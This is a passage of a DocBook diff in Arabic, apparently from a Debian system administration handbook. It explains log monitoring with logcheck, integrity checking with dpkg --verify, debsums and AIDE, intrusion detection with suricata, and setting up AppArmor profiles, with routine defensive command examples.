+      <indexterm><primary>سجلات</primary><secondary>مراقبة</secondary></indexterm>
+      <indexterm><primary>مراقبة</primary><secondary>ملفات السجلات</secondary></indexterm>
+
+      <para>يراقب البرنامج <command>logcheck</command> ملفات السجلات في كل ساعة افتراضياً حيث يرسل رسائل السجل غير الطبيعية إلى مدير النظام عبر البريد الإلكتروني لمتابعة تحليلها.</para>
+
+      <para>تُخزَّن لائحة الملفات التي يراقبها في <filename dir="ltr">/etc/logcheck/logcheck.logfiles</filename>؛ القيم الافتراضية جيدة إذا لم يكن الملف <filename dir="ltr">/etc/rsyslog.conf</filename> أعيد بناؤه بالكامل.</para>
+
+      <para>يمكن أن يعمل <command>logcheck</command> في وضع واحد من ثلاثة أوضاع تختلف بمستوى تفصيلها: <emphasis>paranoid</emphasis> (مُرتاب) و <emphasis>server</emphasis> (مُخدِّم) و <emphasis>workstation</emphasis> (محطة عمل). الوضع الأول مفصل جداً، ويجب عدم استخدامه على الأرجح إلا على مخدمات خاصة مثل الجدران النارية. الوضع الثاني (والافتراضي) هو الوضع المفضل لمعظم المخدمات. أما الوضع الأخير فهو مصمم لمحطات العمل، وهو أكثر إيجازاً (يحجب رسائل أكثر).</para>
+
+      <para>في جميع الحالات الثلاث. يجب تخصيص <command>logcheck</command> على الأغلب لاستبعاد بعض الرسائل الإضافية (اعتماداً على الخدمات المثبتة)، إلا إذا كان مدير النظام يريد فعلاً تلقي دفعات ساعية من رسائل بريدية طويلة وغير مهمة. بما أن آلية اختيار الرسائل معقدة نوعاً ما، يجب قراءة الملف <filename dir="ltr">/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> ودماغك نشط حتى تفهمها بشكل أفضل.</para>
+
+      <para>يمكن تقسيم القواعد المطبّقة إلى عدة أنواع:</para>
+      <itemizedlist>
+        <listitem>
+	  <para>القواعد التي تصنف الرسالة على أنها محاولة اختراق (مخزنة في ملف ضمن المجلد <filename dir="ltr">/etc/logcheck/cracking.d/</filename>)؛</para>
+        </listitem>
+        <listitem>
+	  <para>القواعد التي تلغي التصنيف السابق (<filename>/etc/logcheck/cracking.ignore.d/</filename>)؛</para>
+        </listitem>
+        <listitem>
+	  <para>القواعد التي تصنف الرسالة على أنها تحذير أمني (<filename>/etc/logcheck/violations.d/</filename>)؛</para>
+        </listitem>
+        <listitem>
+	  <para>القواعد التي تلغي التصنيف السابق (<filename>/etc/logcheck/violations.ignore.d/</filename>)؛</para>
+        </listitem>
+        <listitem>
+	  <para>وأخيراً، القواعد التي على بقية الرسائل (التي تعتبر كأحداث نظام <emphasis>system events</emphasis>).</para>
+        </listitem>
+      </itemizedlist>
+
+      <sidebar>
+        <title><emphasis>تحذير</emphasis> تجاهل رسالة</title>
+
+	<para>لا يمكن تجاهل أي رسالة تصنف على أنها محاولة اختراق أو تحذير أمني (نتيجة اتباع قاعدة مخزنة في الملف <filename dir="ltr">/etc/logcheck/violations.d/myfile</filename> ) إلا بقاعدة في الملف <filename dir="ltr">/etc/logcheck/violations.ignore.d/myfile</filename> أو الملف <filename dir="ltr">/etc/logcheck/violations.ignore.d/myfile-<replaceable>extension</replaceable></filename>.</para>
+      </sidebar>
+
+      <para> كما تُرسَل أحداث النظام دائماً إلا في حال وجود قاعدة في أحد المجلدات <filename dir="ltr">/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename> تُبيّن وجوب تجاهل هذا الحدث. طبعاً، لا تؤخذ بعين الاعتبار إلا المجلدات التي توافق مستوى التفصيل لوضع العمل المحدد والمستويات الأعلى منه.</para>
+    </section>
+    <section id="sect.monitoring-activity">
+      <title>مراقبة النشاطات</title>
+      <indexterm><primary>مراقبة</primary><secondary>نشاطات</secondary></indexterm>
+      <indexterm><primary>نشاطات، مراقبة</primary></indexterm>
+      <section id="sect.real-time-monitoring">
+        <title>في الزمن الحقيقي</title>
+
+	<para><command>top</command> هي أداة تفاعلية تعرض قائمة بالعمليات النشطة حالياً. يعتمد الترتيب الافتراضي على نسبة استخدام المعالج ويمكن الوصول لهذا الترتيب بالمفتاح <keycap>P</keycap>. من الخيارات الأخرى المتاحة للترتيب الترتيب حسب كمية الذاكرة المحجوزة (المفتاح <keycap>M</keycap>)، أو حسب الزمن الكلي للمعالج (المفتاح <keycap>T</keycap>) أو حسب مُعرّف العملية (المفتاح <keycap>N</keycap>). يسمح المفتاح <keycap>k</keycap> بقتل عملية عبر إدخال رقم تعريفها. ويسمح المفتاح <keycap>r</keycap> <emphasis>بإعادة تهذيب</emphasis> العملية، أي تغيير أولويتها.</para>
+        <indexterm><primary><command>top</command></primary></indexterm>
+
+	<para>عندما يبدو أن حمل النظام زائد، تسمح <command>top</command> بالتعرف على العمليات التي تتنافس على وقت المعالج أو التي تستهلك الكثير من الذاكرة. بالأخص، تفيد هذه الأداة في التحقق من توافق العمليات التي تستهلك الموارد مع الخدمات الحقيقية التي نعرف أن الجهاز يستضيفها. أي عملية غير معروفة تعمل بصلاحيات المستخدم www-data (مثلاً) يجب أن تبدو ظاهرة تماماً ويجب التحقق منها، لأنها على الأغلب نسخة من برمجية مثبتة ومنفّذة على النظام عبر استغلال ثغرة في أحد تطبيقات الوب.</para>
+
+	<para><command>top</command> أداة مرنة جداً وتفصل صفحة دليلها طريقة تخصيص أسلوب عرضها للمعلومات وتكييفها مع احتياجاتك وعاداتك.</para>
+
+        <para>الأداة الرسومية <command>gnome-system-monitor</command> تشبه <command>top</command> وتوفر المزايا نفسها تقريباً.</para>
+
+        <indexterm><primary><command>gnome-system-monitor</command></primary></indexterm>
+      </section>
+      <section id="sect.monitoring-history">
+        <title>من الماضي</title>
+        <indexterm><primary>نشاطات، تاريخ</primary></indexterm>
+
+	<para>حمل المعالج ونشاط الشبكة والمساحة التخزينية الحرة هي معلومات متغيرة باستمرار يفيد تتبع تاريخ تطورها غالباً في التعرف على طريقة استثمار الحاسوب بدقة.</para>
+        <indexterm><primary>SNMP</primary></indexterm>
+        <indexterm><primary>Simple Network Management Protocol</primary></indexterm>
+
+	<para>هناك أدوات عديدة مخصصة لهذه المهمة. معظمها قادر على جلب البيانات عبر SNMP‏ (<emphasis>Simple Network Management Protocol</emphasis>) وذلك لمركزة هذه المعلومات. من المكاسب المضافة هي أن هذا يسمح بجلب البيانات من العناصر الشبكية التي قد لا تكون بالضرورة حواسيباً عامة الأغراض، مثل موجهات الشبكة المتخصصة أو التحويلات.</para>
+
+	<para>يغطي هذا الكتاب Munin بالتفصيل (انظر <xref linkend="sect.munin" />) في الفصل <xref linkend="advanced-administration" xrefstyle="select: label quotedtitle" />. توفر دبيان أيضاً أداة مشابهة هي <emphasis role="pkg">cacti</emphasis>. وضع هذه الأداة في الخدمة أعقد قليلاً، لأنها تعتمد كلياً على SNMP. ورغم أنها تملك واجهة وب، إلا أن استيعاب مفاهيم إعدادها لا يزال صعباً. لا مفر من قراءة وثائق HTML‏ (<filename dir="ltr">/usr/share/doc/cacti/html/index.html</filename>) إذا كنت ستستعمل هذه الأداة.</para>
+
+        <sidebar>
+          <title><emphasis>بدائل</emphasis> <command>mrtg</command></title>
+          <indexterm><primary><command>mrtg</command></primary></indexterm>
+
+	  <para><command>mrtg</command> (في الحزمة ذات الاسم نفسه) هي أداة أقدم. ورغم بعض نقاط الضعف، إلا أنها تستطيع جمع البيانات التأريخية وعرضها كمخططات. كما تتضمّن عدداً من السكربتات المخصصة لجمع أكثر البيانات التي تُراقب عادة مثل حمل المعالج، ونشاط الشبكة، وعدد مرات الدخول إلى صفحة وب، وغيرها.</para>
+
+	  <para>تحوي الحزمتين <emphasis role="pkg">mrtg-contrib</emphasis> و <emphasis role="pkg">mrtgutils</emphasis> أمثلة عن سكربتات يمكن استخدامها مباشرة.</para>
+        </sidebar>
+      </section>
+    </section>
+    <section>
+      <title>اكتشاف التغيُّرات</title>
+
+      <para>بعد تثبيت النظام وإعداده، وفيما عدا التحديثات الأمنية، ليس هناك أي داعي عادة لتطور معظم الملفات والمجلدات، إلا البيانات. من المهم إذن التأكد من عدم تغيُّر الملفات فعلاً: أي تغيير غير متوقع عندئذ يستحق التقصي حوله. يعرض هذا القسم بضعة أدوات قادرة على مراقبة الملفات وتحذير مدير النظام عند حدوث أي تغيير غير متوقع (أو لسرد هذه التغييرات ببساطة).</para>
+      <section id="sect.dpkg-verify">
+        <title>فحص سلامة الحزم باستخدام <command>dpkg --verify</command></title>
+        <indexterm><primary><command>dpkg</command></primary><secondary><command>dpkg --verify</command></secondary></indexterm>
+        <sidebar>
+          <title><emphasis>التعمق أكثر</emphasis> الحماية من التغيرات المنبعية</title>
+
+	  <para>يفيد <command>dpkg --verify</command> في اكتشاف التغيرات على الملفات داخل حزم دبيان، لكنه عديم الفائدة إذا تعرضت الحزمة نفسها للعبث. للحماية من هذا النوع من الهجمات يجب استخدام نظام APT للتحقق من التواقيع الرقمية (انظر <xref linkend="sect.package-authentication" />)، والانتباه إلى تثبيت الحزم من مصادر موثوقة فقط.</para>
+        </sidebar>
+
+        <para><command>dpkg --verify</command> (أو <command>dpkg -V</command>) هي أداة مهمة لأنها تسمح بمعرفة أي الملفات المثبتة قد عدلت (نتيجة هجوم) مثلاً، لكن لا تكن واثقاً من هذا تماماً. تعتمد هذه الأداة في عملها على checksums مخزنة في قاعدة بيانات dpkg التي تُخزَّن على القرص الصلب (يمكنك العثور عليها في <filename dir="ltr">/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename>)؛ والمهاجم الخبير سوف يحدث هذه الملفات بحيث يسجل فيها قيم checksum الجديدة للملفات المخربة.</para>
+
+        <sidebar>
+          <title><emphasis>أساسيات</emphasis> بصمات الملفات</title>
+	  <indexterm><primary>بصمة</primary></indexterm>
+	  <indexterm><primary>control sum</primary></indexterm>
+	  <indexterm><primary>MD5</primary></indexterm>
+	  <indexterm><primary>SHA1</primary></indexterm> 
+          <para>للتذكرة: البصمة هي قيمة، رقميّة غالباً (رغم أنها تكتب بالتدوين الست عشري)، تحوي شكلاً من التوقيع الرقمي لمحتويات الملف. يُحسَب هذا التوقيع بخوارزمية (من الأمثلة المشهورة MD5 أو SHA1) تضمن أن أي تغيير (تقريباً) على محتويات الملف، مهما كان صغيراً، سيؤدي لتغير البصمة؛ يعرف هذا ”بأثر التَّيْهور avalanche effect“. يسمح هذا باستخدام بصمة رقمية بسيطة للتحقق من عدم تغيّر محتويات الملف. هذه الخوارزميات غير عكوسة؛ أي أن معرفة البصمة، في معظم هذه الخوارزميات، لا تسمح بالعثور على المحتويات الموافقة لها. يبدو أن التطورات الأخيرة في الرياضيات قد أضعفت منعة هذه المبادئ، لكن لم تصل لمرحلة التشكيك في استخدامها حتى الآن، لأنه يبدو أن إنشاء محتويات مختلفة تعطي البصمة نفسها لا يزال صعباً جداً.</para>
+        </sidebar>
+
+        <para>عند استدعاء <command>dpkg -V</command> سيتحقق من كافة الحزم المثبتة وسيطبع سطراً يقابل كل ملف يفشل اختبار سلامته. صيغة الخرج هي صيغة خرج <command>rpm -V</command> نفسها حيث يمثل كل محرف اختباراً على بيانات فوقية محددة. لسوء الحظ، لا يخزن <command>dpkg</command> البيانات الفوقية اللازمة لمعظم الاختبارات ولذلك يطبع علامات استفهام مكانها. حالياً اختبار التحقق من checksum هو الوحيد الذي يمكن أن يطبع "5" عند المحرف الثالث (إذا فشل الاختبار).</para>
+        <screen>
+<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
+<computeroutput>؟؟5؟؟؟؟؟؟   /lib/systemd/system/ssh.service
+؟؟5؟؟؟؟؟؟ c /etc/libvirt/qemu/networks/default.xml
+؟؟5؟؟؟؟؟؟ c /etc/lvm/lvm.conf
+؟؟5؟؟؟؟؟؟ c /etc/salt/roster</computeroutput></screen>
+        <para>في العينة أعلاه، يبين dpkg حدوث تغيير على ملف تابع لخدمة SSH حيث عدل عليه مدير النظام بدلاً من استخدام ملف <filename dir="ltr">/etc/systemd/system/ssh.service</filename> صحيح يلغي تأثيره (والذي كان سيُخزَّن في <filename dir="ltr">/etc</filename> وهذا ما يفترض أن يكون لأي تغيير على الإعدادات). كما يذكر أيضاً عدة ملفات إعداد (يميزها المحرف "c" في الحقل الثاني) التي عُدِّلت بشكل نظامي.</para>
+      </section>
+
+      <section id="sect.debsums">
+        <title>فحص الحزم: <command>debsums</command> وحدودها</title>
+        <indexterm><primary><command>debsums</command></primary></indexterm>
+
+        <para>الأمر <command>debsums</command> هو سالف <command>dpkg -V</command> وقد أصبح مهجوراً تقريباً. يعاني <command>debsums</command> من قيود dpkg نفسها. لكن ولحسن الحظ، يمكن تفادي بعض القيود فيه (بينما لا يمكن تفاديها في dpkg).</para>
+
+        <para>بما أن البيانات على القرص الصلب غير موثوقة، يقدم <command>debsums</command> خيار فحص الملفات المُثبّتة اعتماداً على ملفات <filename dir="ltr">.deb</filename> بدلاً من الاعتماد على قاعدة بيانات dpkg. يمكننا الاعتماد على تنزيلات APT المصدقة لتنزيل ملفات <filename dir="ltr">.deb</filename> موثوقة لكل الحزم المثبتة على النظام. قد تكون هذه العملية بطيئة ومملة، لذلك يجب عدم اتخاذها كتقنية وقائية تستخدم على نحو منتظم.</para>
+
+        <screen>
+<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
+<computeroutput>[ ... ]
+# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput></screen>
+
+	<para>لاحظ أن هذا المثال يستخدم <command>grep-status</command> من الحزمة <emphasis role="pkg">dctrl-tools</emphasis>، وهي غير مثبتة افتراضياً.</para>
+      </section>
+      <section>
+        <title>مراقبة الملفات: AIDE</title>
+        <indexterm><primary><emphasis role="pkg">aide</emphasis> (حزمة دبيان)</primary></indexterm>
+
+	<para>تسمح الأداة AIDE‏ (<emphasis>Advanced Intrusion Detection Environment</emphasis>) بالتحقق من سلامة الملفات، واكتشاف أي تغيّرات اعتماداً على صورة مسجلة سابقاً للنظام السليم. تُخزّن هذه الصورة كقاعدة بيانات (<filename dir="ltr">/var/lib/aide/aide.db</filename>) تحوي خصائص جميع ملفات النظام (البصمات، الصلاحيات، التواريخ وغيرها). تُهيّأ قاعدة البيانات هذه أولاً باستخدام <command>aideinit</command>؛ وبعدها تُستخدَم يومياً (يستخدمها السكربت <filename dir="ltr">/etc/cron.daily/aide</filename>) للتحقق من عدم تغير أي شيء. عند اكتشاف أي تغير، تسجله AIDE في سجلاتها (<filename dir="ltr">/var/log/aide/*.log</filename>) وترسل ما وجدته إلى مدير النظام عبر البريد الإلكتروني.</para>
+
+        <sidebar>
+          <title><emphasis>ممارسة عملية</emphasis> حماية قاعدة البيانات</title>
+
+	  <para>بما أن AIDE تستخدم قاعدة بيانات محلية لمقارنة حالة الملفات، فإن صحة نتائجها ترتبط مباشرة بسلامة قاعدة البيانات. إذا حصل المهاجم على صلاحيات الجذر على النظام المُختَرَق، عندها يستطيع استبدال قاعدة البيانات وتغطية آثاره. من الحلول الممكنة لهذه المشكلة تخزين البيانات على وسيط تخزيني للقراءة فقط.</para>
+        </sidebar>
+
+	<para>هناك العديد من الخيارات في <filename dir="ltr">/etc/default/aide</filename> التي يمكن استخدامها لتعديل سلوك حزمة <emphasis role="pkg">aide</emphasis>. تخزن إعدادات هذا البرنامج في <filename dir="ltr">/etc/aide/aide.conf</filename> و <filename>/etc/aide/aide.conf.d/</filename> (في الواقع، يستخدم <command>update-aide.conf</command> هذه الملفات فقط لتوليد <filename dir="ltr">/var/lib/aide/aide.conf.autogenerated</filename>). تدل الإعدادات على الملفات وخصائص الملفات المطلوب التحقق منها. مثلاً، تتغير محتويات ملفات السجلات بشكل متكرر، ويمكن تجاهل هذه التغيرات طالما أن صلاحيات الوصول لهذه الملفات لم تتغير، لكن بالنسبة للبرامج التنفيذية يجب أن تبقى محتوياتها وصلاحياتها ثابتة. رغم أن صيغة هذه الإعدادات ليست بالغة التعقيد، إلا أنها ليست بدهية أيضاً. قراءة صفحة الدليل <citerefentry><refentrytitle>aide.conf</refentrytitle> <manvolnum>5</manvolnum></citerefentry>‎ إذن سوف تفيد.</para>
+
+	<para>تُولّد نسخة جديدة من قاعدة البيانات يومياً في <filename dir="ltr">/var/lib/aide/aide.db.new</filename>؛ إذا كانت جميع التغييرات المسجّلة مشروعة، يمكن استخدام هذه النسخة لاستبدال قاعدة البيانات المرجعية.</para>
+
+        <sidebar>
+          <title><emphasis>بدائل</emphasis> Tripwire و Samhain</title>
+
+	  <para>Tripwire يشبه AIDE كثيراً؛ حتى أن صيغة ملفات الإعداد نفسها تقريباً. الزيادة الرئيسية التي يضيفها <emphasis role="pkg">tripwire</emphasis> هي آلية لتوقيع ملف الإعداد، بحيث لا يستطيع المهاجم تعديله حتى يشير لنسخة مختلفة من قاعدة البيانات المرجعية.</para>
+
+	  <para>كما يوفر Samhain مزايا مشابهة، بالإضافة لبعض الوظائف التي تساعد على اكتشاف rootkits (انظر الملاحظة الجانبية <xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages" />). كما يمكن تثبيته على الشبكة كلها وتسجيل نتائجه على مخدم مركزي (مع استخدام توقيع).</para>
+        </sidebar>
+
+        <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages">
+          <title><emphasis>نظرة سريعة</emphasis> الحزم <emphasis role="pkg">checksecurity</emphasis> و <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis></title>
+          <indexterm><primary><emphasis role="pkg">checksecurity</emphasis></primary></indexterm>
+
+	  <para>تحوي أولى هذه الحزم عدة سكربتات صغيرة تجري اختبارات أساسية على النظام (كلمات السر الفارغة، ملفات setuid جديدة، وما شابه) وتُحذِّر مدير النظام إذا اقتضى الأمر. رغم اسمها الواضح، إلا أنه لا يجب أن يعتمد مدير النظام عليها وحدها للتأكد من أمان نظام لينكس.</para>
+
+	  <para>تسمح الحزمتين <emphasis role="pkg">chkrootkit</emphasis> و <emphasis role="pkg">rkhunter</emphasis> بالبحث عن <emphasis>rootkits</emphasis> التي يحتمل أنها مثبّتة على النظام. للتذكرة، rootkits هي برمجيات مصممة لإخفاء عملية اختراق النظام بينما تحافظ على إمكانية التحكم بالجهاز بصمت. ليست الفحوصات موثوقة 100%، لكنها قد تلفت انتباه مدير النظام عادة للمشاكل الكامنة.</para>
+        </sidebar>
+      </section>
+    </section>
+    <section id="sect.intrusion-detection">
+      <title>اكتشاف التطفل (IDS/NIDS)</title>
+      <indexterm><primary>اكتشاف، تطفل</primary></indexterm>
+      <indexterm><primary>اكتشاف التطفل</primary></indexterm>
+      <indexterm><primary>IDS</primary></indexterm>
+      <indexterm><primary>نظام اكتشاف التطفل</primary></indexterm>
+      <indexterm><primary>NIDS</primary></indexterm>
+      <indexterm><primary>Network</primary><secondary>IDS</secondary></indexterm>
+
+      <sidebar>
+        <title><emphasis>أساسيات</emphasis> Denial of service</title>
+        <indexterm><primary>denial of service</primary></indexterm>
+
+	<para>تهدف هجمات ”denial of service“ لغرض واحد فقط: إيقاف خدمة عن العمل. سواء كان الهجوم يشمل إغراق المخدم بالطلبات أو استغلال علة ما، النتيجة النهائية هي نفسها: لم تعد الخدمة متوفرة. المستخدمون المنتظمون غير راضين، وتعاني الهيئة التي تستضيف الخدمة المستهدفة من خسارة سمعتها (وربما أرباحها، إذا كانت الخدمة مثلاً موقع تجارة إلكترونية).</para>
+
+	<para>توصف هذه الهجمات أحياناً بأنها ”موزعة“ (distributed)؛ حيث تشمل هذه الهجمات إغراق المخدم بعدد ضخم من الطلبات التي ترد من مصادر مختلفة عديدة بحيث يعجز المخدم عن إجابة الطلبات النظامية. اكتسب هذان النوعان من الهجمات اختصارين شهيرين: <acronym>DDoS</acronym> و <acronym>DoS</acronym> (الأول للهجمات الموزعة والثاني للهجمات العادية).</para>
+      </sidebar>
+
+      <para><command>suricata</command> (في حزمة دبيان ذات الاسم نفسه) هو NIDS‏ — <emphasis>Network Intrusion Detection System</emphasis> (نظام كشف تطفل). مهمته هي الإنصات للشبكة ومحاولة اكتشاف محاولات الاختراق و (أو) الأفعال العدائية (بما فيها هجمات denial of service). تُسجّل جميع هذه الأحداث في عدة ملفات في <filename dir="ltr">/var/log/suricata</filename>. هناك أدوات من أطراف ثالثة (Kibana/logstash) تستعرض كافة البيانات الملتقطة بشكل أفضل. <ulink type="block" url="http://suricata-ids.org" /> <ulink type="block" url="https://www.elastic.co/products/kibana" /></para>
+      <indexterm><primary><command>snort</command></primary></indexterm>
+      <indexterm><primary><command>suricata</command></primary></indexterm>
+
+      <sidebar>
+        <title><emphasis>تحذير</emphasis> المدى المجدي</title>
+
+	<para>تتحدد فعالية <command>suricata</command> بمقدار الحركة التي يراها من خلال الواجهة الشبكية المراقبة. من الواضح أنه لن يتمكن من اكتشاف أي شيء إذا لم يتمكن من معاينة الحركة الحقيقية على الشبكة. سوف يراقب إذن، عند توصيله مع تحويلة شبكية (switch)، الهجمات التي تستهدف الجهاز الذي يعمل عليه فقط، وهذا ليس المقصود على الأرجح. بالتالي، يجب توصيل الجهاز الذي يستضيف <command>suricata</command> بمنفذ ”المرآة“ في التحويلة، المخصص لربط التحويلات مع بعضها وبالتالي تصل إليه جميع الرزم.</para>
+      </sidebar>
+
+      <para>لضبط suricata يجب مراجعة الملف <filename dir="ltr">/etc/suricata/suricata-debian.yaml</filename> وتعديله. هذا الملف طويل جداً بسبب التعليقات المسهبة لكل متغير. يتطلب أصغر إعداد ممكن تحديد مجالات العناوين التي تغطيها الشبكة المحلية (المتغير <literal>HOME_NET</literal>). عملياً، هذا يعني مجموعة العناوين التي يحتمل استهدافها بالهجمات. لكن لتحقيق الاستفادة القصوى يجب قراءة الملف كاملاً وتعديله بما يناسب الوضع محلياً.</para>
+      <para>بالإضافة لهذا عليك تحرير <filename dir="ltr">/etc/default/suricata</filename> وتعريف الواجهة الشبكية التي ستُرَاقَب وتفعيل سكريبت الإقلاع (عبر ضبط القيمة <literal>RUN=yes</literal>). كما قد ترغب بضبط القيمة <literal>LISTENMODE=pcap</literal> لأن القيمة الافتراضية <literal>LISTENMODE=nfqueue</literal> تتطلب إعدادات إضافية حتى تعمل بشكل صحيح (يجب ضبط الجدار الناري netfilter بحيث يمرر الرزم إلى رتل في ساحة المستخدم يتحكم به suricata عبر استخدام الهدف <literal>NFQUEUE</literal>).</para>
+      <para>يحتاج <command>suricata</command> إلى مجموعة من قواعد المراقبة حتى يكتشف السلوك الضار: يمكنك الحصول على هذه القواعد من الحزمة <emphasis role="pkg">snort-rules-default</emphasis>. ‏<command>snort</command> هو المرجع القديم في مجال اكتشاف التطفل، ويستطيع <command>suricata</command> إعادة استخدام القواعد المكتوبة له. للأسف تلك الحزمة مفقودة في <emphasis role="distribution">دبيان جيسي</emphasis> وعليك الحصول عليها من إصدارة دبيان أخرى مثل <emphasis role="distribution">الاختبارية</emphasis> أو <emphasis role="distribution">غير المستقرة</emphasis>.</para>
+      <para>هناك حل بديل وهو استخدام <command>oinkmaster</command> (من الحزمة ذات الاسم نفسه) لتنزيل مجموعات قواعد Snort من مصادر خارجية.</para>
+      <sidebar>
+        <title><emphasis>التعمق أكثر</emphasis> التكامل مع <command>prelude</command></title>
+
+	<para>يوفر Prelude مراقبة مركزية للمعلومات الأمنية. تتضمن معماريته التجزيئية مخدماً (<emphasis>manager</emphasis> في <emphasis role="pkg">prelude-manager</emphasis>) الذي يجمع التحذيرات التي تولدها الحساسات (<emphasis>sensors</emphasis>) المختلفة.</para>
+
+	<para>يمكن إعداد Suricata حتى يعمل كحساس. من الحساسات الأخرى <emphasis>prelude-lml</emphasis>‏ (<emphasis>Log Monitor Lackey</emphasis>) الذي يراقب ملفات السجلات (بطريقة تشبه <command>logcheck</command>، المشروح في <xref linkend="sect.logcheck" />).</para>
+        <indexterm><primary><command>prelude</command></primary></indexterm>
+      </sidebar>
+    </section>
+  </section>
+  <section id="sect.apparmor">
+    <title>مقدمة إلى AppArmor</title>
+    <indexterm><primary>AppArmor</primary></indexterm>
+    <section id="sect.apparmor-principles">
+      <title>المبادئ</title>
+      <para>AppArmor هو نظام تحكم إلزامي بالوصول <emphasis>Mandatory Access Control</emphasis> ‏(MAC) مبني على واجهة LSM‏ (<emphasis>Linux Security Modules</emphasis>) في لينكس. عملياً، تستشير النواة AppArmor قبل كل استدعاء للنظام حتى تعرف إذا كانت العملية المستدعية مخولة لتنفيذ الإجراء المطلوب. يعتمد AppArmor على هذه الآلية لتقييد التطبيقات بمجموعة محددة من الموارد.</para>
+      <indexterm><primary><emphasis>Mandatory Access Control</emphasis></primary></indexterm>
+      <indexterm><primary><emphasis>Linux Security Modules</emphasis></primary></indexterm>
+      <para>يُطبِّق AppArmor مجموعة قواعد (تدعى ”البروفايل“) على كل برنامج. يختلف البروفايل الذي تطبقه النواة على كل برنامج باختلاف مسار تثبيته؛ ولا تعتمد القواعد على المستخدم الذي يستدعي البرنامج، بخلاف SELinux (الذي ناقشناه في <xref linkend="sect.selinux" />). يخضع المستخدمون كلهم لنفس القواعد عند تنفيذ نفس البرنامج (لكن صلاحيات المستخدمين التقليدية تطبق عليهم طبعاً وهذا قد يؤدي لاختلاف النتائج!).</para>
+      <para>تُخزَّن بروفايلات AppArmor في <filename>/etc/apparmor.d/</filename> وهي تحوي قائمة من قواعد التحكم بالوصول لكل الموارد التي يمكن أن يستخدمها أي برنامج. يترجم <command>apparmor_parser</command> هذه البروفايلات ويحملها إلى النواة. يمكن تحميل كل بروفايل إما في وضع الإلزام أو وضع الشكوى. يفرض الوضع الأول اتباع السياسة ويبلغ عن محاولات اختراقها، أما الوضع الثاني فلا يفرض السياسة بل يكتفي بتسجيل نداءات النظام التي تخالف السياسة والتي كان الوضع الأول سيمنعها.</para>
+    </section>
+    <section id="sect.apparmor-setup">
+      <title>تفعيل AppArmor وإدارة بروفايلاته</title>
+      <para>دعم AppArmor مدمج في النوى القياسية التي توفرها دبيان. لا يحتاج تفعيل AppArmor إلا لتثبيت بضعة حزم وإضافة بعض المتغيرات إلى سطر إقلاع النواة:</para>
+      <screen><computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils
+</userinput><computeroutput>[...]
+# </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub
+</userinput><computeroutput># </computeroutput><userinput>update-grub
+</userinput></screen>
+      <para>وبعد إعادة الإقلاع سيعمل AppArmor ويمكن التحقق من ذلك فوراً عبر <command>aa-status</command>:</para>
+      <screen>
+<computeroutput># </computeroutput><userinput>aa-status</userinput>
+<computeroutput>apparmor module is loaded.
+44 profiles are loaded.
+9 profiles are in enforce mode.
+   /usr/bin/lxc-start
+   /usr/lib/chromium-browser/chromium-browser//browser_java
+[...]
+35 profiles are in complain mode.
+   /sbin/klogd
+[...]
+3 processes have profiles defined.
+1 processes are in enforce mode.
+   /usr/sbin/libvirtd (1295) 
+2 processes are in complain mode.
+   /usr/sbin/avahi-daemon (941) 
+   /usr/sbin/avahi-daemon (1000) 
+0 processes are unconfined but have a profile defined.</computeroutput></screen>
+      <sidebar>
+        <title><emphasis>ملاحظة</emphasis> بروفايلات AppArmor إضافية</title>
+        <para>تحوي الحزمة <emphasis role="pkg">apparmor-profiles</emphasis> بروفايلات يديرها مجتمع AppArmor المنبعي. للحصول على بروفايلات إضافية أخرى يمكنك تثبيت <emphasis role="pkg">apparmor-profiles-extra</emphasis> التي تحوي بروفايلات من تطوير أوبنتو ودبيان.</para>
+      </sidebar>
+      <para>يمكن تبديل حالة كل بروفايل بين وضع الإلزام ووضع الشكوى عبر استدعاء <command>aa-enforce</command> و<command>aa-complain</command> مع إعطاء مسار الملف التنفيذي أو مسار ملف السياسة كمتغير. كما يمكن تعطيل البروفايل تماماً عبر <command>aa-disable</command> أو وضعه في حالة الاختبار (لتسجيل نداءات النظام المسموحة أيضاً) عبر <command>aa-audit</command>.</para>
+      <screen>
+<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
+<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
+<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
+<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
+      </screen>
+    </section>
+    <section id="sect.apparmor-new-profile">
+      <title> إنشاء بروفايل جديد</title>
+      <para>رغم أن إنشاء بروفايلات AppArmor سهل، إلا أن معظم البرامج ليس لها بروفايل. سنشرح في هذا القسم طريقة إنشاء بروفايل جديد من الصفر عبر استخدام البرنامج المستهدف وترك AppArmor يراقب نداءات النظام التي يجريها والموارد التي يستخدمها.</para>
+      <para>أهم البرامج التي يجب تقييدها هي البرامج التي تواجه الشبكة لأنها أكثر ما يستهدفه المهاجمون عن بعد. لهذا السبب يوفر AppArmor الأمر المساعد <command>aa-unconfined</command> الذي يسرد البرامج التي توفر مقابس شبكية مفتوحة دون أن ترتبط مع أي بروفايل. ومع استخدام الخيار <literal dir="ltr">--paranoid</literal> سيذكر لك كل العمليات التي تملك اتصالاً شبكياً واحداً نشطاً أو أكثر.</para>
+      <screen>
+<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
+<computeroutput>801 /sbin/dhclient not confined
+890 /sbin/rpcbind not confined
+899 /sbin/rpc.statd not confined
+929 /usr/sbin/sshd not confined
+941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
+988 /usr/sbin/minissdpd not confined
+1276 /usr/sbin/exim4 not confined
+1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
+1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
